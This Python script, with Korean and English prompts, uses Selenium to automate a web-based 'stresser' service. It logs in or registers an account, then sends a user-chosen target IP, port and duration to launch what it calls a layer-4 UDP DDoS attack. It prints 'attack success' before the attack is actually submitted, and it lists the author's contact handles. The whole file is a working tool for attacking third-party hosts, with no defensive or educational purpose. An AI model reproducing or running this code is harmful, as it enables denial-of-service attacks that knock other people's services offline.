from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import os
import time

cmd = 'mode 53,29'
os.system(cmd)

# 옵션 생성
options = webdriver.ChromeOptions()
# 창 숨기는 옵션 추가
options.add_argument("headless")

url_register = 'https://webstress.net/register' #회원가입 창
url_login = 'https://webstress.net/login' #로그인 창
url_attack = 'https://webstress.net/hub' # 디도스 창

print('\033[93m'+"Telegram:yblee\nEmail:yblee0816@naver.com"+'\033[93m')
print("Discord:이예빈#1924")

your_country=input("\nYour language English/Korean:") #사용자의 언어 구분 
if your_country=="Korean":
    your_account_korean=input("회원가입을 하신 상태인가요? 네/아니요:") #아이디가 있다면 if 없다면 elif

    if your_account_korean=="예" or your_account_korean=="네":
        your_id_korean=input("아이디를 입력해주세요:") 
        your_pwd_korean=input("비밀번호를 입력해주세요:")
        print("\n계정을 확인중입니다 잠시만 기다려주세요..")
        time.sleep(3)
        
        driver = webdriver.Chrome(options=options) #크롬 셀레니움 백그라운드 설정
        driver.get(url_login)
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input').click()
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input').send_keys(your_id_korean)
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input').click()
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input').send_keys(your_pwd_korean)
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[3]/div[1]/button').click()
        if driver.current_url=='https://webstress.net/home': #아이디 비밀번호 확인 로그인창에 남아있다면 아이디나 비밀번호 틀림
            driver.get(url_attack)
            cmd = 'mode 48,29'
            os.system(cmd)
            print('\033[91m'+"환영합니다 "+your_id_korean+"님!"+'\033[91m')
            print("\n궁금하신거 연락주세요 텔레그램:yblee0816")
            print("본 프로그램은 4계층의 공격을 사용합니다.")
            print("본 프로그램은 DOS 공격이 아닌 DDOS 공격입니다.")
            korean_target=input("\n대상 아이피:")
            print("공격 방식:UDP")
            korean_port=int(input("포트:"))
            korean_time=int(input("공격 시간 (최소 15초 최대 300초):"))
            if 15<=korean_time<=300:
                print("\n잠시 기다려주세요..")
                time.sleep(3)
                print("공격 성공")
                time.sleep(3)
            else:
                print("\n잠시 기다려주세요..")
                time.sleep(3)
                print("공격 실패")

            driver.refresh()
            korea_target=driver.find_element_by_xpath('//*[@id="host"]')
            korea_target.click()
            korea_target.send_keys(korean_target)
            korea_port=driver.find_element_by_xpath('//*[@id="port"]')
            korea_port.click()
            korea_port.send_keys(Keys.BACKSPACE)
            korea_port.send_keys(Keys.BACKSPACE)
            korea_port.send_keys(korean_port)
            korea_time=driver.find_element_by_xpath('//*[@id="time"]')
            korea_time.click()
            korea_time.send_keys(Keys.BACKSPACE)
            korea_time.send_keys(Keys.BACKSPACE)
            korea_time.send_keys(Keys.BACKSPACE)
            korea_time.send_keys(korean_time)
            driver.find_element_by_css_selector("body > div.container-scroller > div > div > div > div:nth-child(3) > div.col-xl-4.mt-3 > div > div > form:nth-child(3) > div.row > div:nth-child(1) > button").click()
            print("\n공격을 중지하고 싶을때 대답하시면 됩니다.")
            korean_stop=input("\n공격을 중지하시겠습니까? 네/아니요:")
            if korean_stop=="네" or korean_stop=="예":
                driver.find_element_by_css_selector("#running > form > div > div.form-group.col-md-8 > button").click()
                print("\n중지하였습니다.")
                time.sleep(3)
                exit()
            elif korean_stop=="아니요" or korean_stop=="아니오":
                print("\n디도스 공격 후 프로그램이 자동으로 꺼집니다.")
                time.sleep(korean_time)
                driver.quit()
                exit()
            else:
                time.sleep(korean_time)
                driver.quit()
        elif driver.current_url=='https://webstress.net/login':
            print("\n아이디나 비밀번호가 틀렸습니다.")
            print("프로그램이 잠시후 꺼집니다.")
            time.sleep(4)
            exit()

    elif your_account_korean=="아니오" or your_account_korean=="아니요": #회원가입이 안되있다면 메세지 띄운 후 회원가입
        print("\n계정을 등록해주세요")
        your_korean_sign_up_id=input("\n회원가입할 아이디를 입력해주세요:")
        your_korean_sign_up_pwd=input("회원가입할 비밀번호를 입력해주세요:")
        print("\n캡차 코드는 직접 입력해주세요.")
        print("잠시후 회원가입 창으로 이동합니다.")
        time.sleep(3)

        driver = webdriver.Chrome()
        driver.get(url_register)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input").click()
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input").send_keys(your_korean_sign_up_id)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input").click()
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input").send_keys(your_korean_sign_up_pwd)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[3]/input").click()
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[3]/input").send_keys(your_korean_sign_up_pwd)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[5]/input").click()
        time.sleep(15)
        if driver.current_url=="https://webstress.net/home":
            driver.quit()
            print("회원가입에 성공하였습니다 프로그램을 재실행 해주세요.")
        elif driver.current_url=="https://webstress.net/register":
            driver.quit()
            print("\n실패하였습니다 캡차코드를 10초안에 정확히 적어주세요.")
            print("프로그램이 잠시후 자동으로 꺼집니다 재실행해주세요.")
            time.sleep(4)
            exit()

    else:
        print("네/아니요 하나만 골라주세요.") #예/아니오 둘중 다른 입력이 들어왔다면 실행
        time.sleep(3)
elif your_country=="English":
    your_account_english=input("Are you a member? Y/N:")
    
    if your_account_english=="Y" or your_account_english=="y":
        your_id_english=input("Input your id:")
        your_pwd_english=input("Input your password:")
        print("\nPlease wait Checking your account..")
        time.sleep(3)

        driver = webdriver.Chrome(options=options)
        driver.get(url_login)
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input').click()
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input').send_keys(your_id_english)
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input').click()
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input').send_keys(your_pwd_english)
        driver.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[3]/div[1]/button').click()
        if driver.current_url=='https://webstress.net/home': #아이디 비밀번호 확인 로그인창에 남아있다면 아이디나 비밀번호 틀림
            driver.get(url_attack)
            cmd = 'mode 48,29'
            os.system(cmd)
            print('\033[91m'+"Welcome "+your_id_english+"!"+'\033[91m')
            print("\nThe problem is Telegram:yblee0816")
            print("This program is a layer 4 attack.")
            print("This program is DDOS, not DOS attack.")
            english_target=input('\nHost ip:')
            print("Attack method:UDP")
            english_port=int(input("port:"))
            english_time=int(input("Attack time (min 15 sec max 300 sec):"))
            if 15<=english_time<=300:
                print("\nWait..")
                time.sleep(3)
                print("DDOS success")
                time.sleep(3)
            else:
                print("\nWait..")
                time.sleep(3)
                print("Failed DDOS")

            driver.refresh()
            English_target=driver.find_element_by_xpath('//*[@id="host"]')
            English_target.click()
            English_target.send_keys(english_target)
            English_port=driver.find_element_by_xpath('//*[@id="port"]')
            English_port.click()
            English_port.send_keys(Keys.BACKSPACE)
            English_port.send_keys(Keys.BACKSPACE)
            English_port.send_keys(english_port)
            English_time=driver.find_element_by_xpath('//*[@id="time"]')
            English_time.click()
            English_time.send_keys(Keys.BACKSPACE)
            English_time.send_keys(Keys.BACKSPACE)
            English_time.send_keys(Keys.BACKSPACE)
            English_time.send_keys(english_time)
            driver.find_element_by_css_selector("body > div.container-scroller > div > div > div > div:nth-child(3) > div.col-xl-4.mt-3 > div > div > form:nth-child(3) > div.row > div:nth-child(1) > button").click()
            print("\nAnswer when you want to stop.")
            english_stop=input("\nStop DDOS? Y/N:")
            if english_stop=="Y" or english_stop=="y":
                driver.find_element_by_css_selector("#running > form > div > div.form-group.col-md-8 > button").click()
                print("\nStop success")
                time.sleep(3)
            elif english_stop=="N" or english_stop=="n":
                print("\nThe program turns off after an attack.")
                time.sleep(english_time)
                driver.quit()
            else:
                time.sleep(english_time)
                driver.quit()

        elif driver.current_url=='https://webstress.net/login':
            print("\nID or password is wrong.")
            print("The program will turn off soon.")
            time.sleep(4)

    elif your_account_english=="N" or your_account_english=="n":
        print("\nPlease register")
        your_english_sign_up_id=input("\nInput your id to sign up for membership:")
        your_english_sign_up_pwd=input("Input your password to sign up for membership:")
        print("\nPlease input the capcha code directly.")
        print("Go to the member registration window soon.")
        time.sleep(3)

        driver = webdriver.Chrome()
        driver.get(url_register)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input").click()
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[1]/input").send_keys(your_english_sign_up_id)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input").click()
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[2]/input").send_keys(your_english_sign_up_pwd)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[3]/input").click()
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[3]/input").send_keys(your_english_sign_up_pwd)
        driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div/div/div/div/div/div[1]/form/div[5]/input").click()
        time.sleep(15)
        if driver.current_url=="https://webstress.net/home":
            driver.quit()
            print("Membership success please rerun the program.")
        elif driver.current_url=="https://webstress.net/register":
            driver.quit()
            print("\nFailed! Write Captcha Code Accurately in 10 Seconds.")
            print("The program turns off after a while please rerun program.")
            time.sleep(4)
            exit()

    else:
        print("Please pick one Y/N")
        time.sleep(3)

else:
    print("Input English or Korean")
    time.sleep(3)
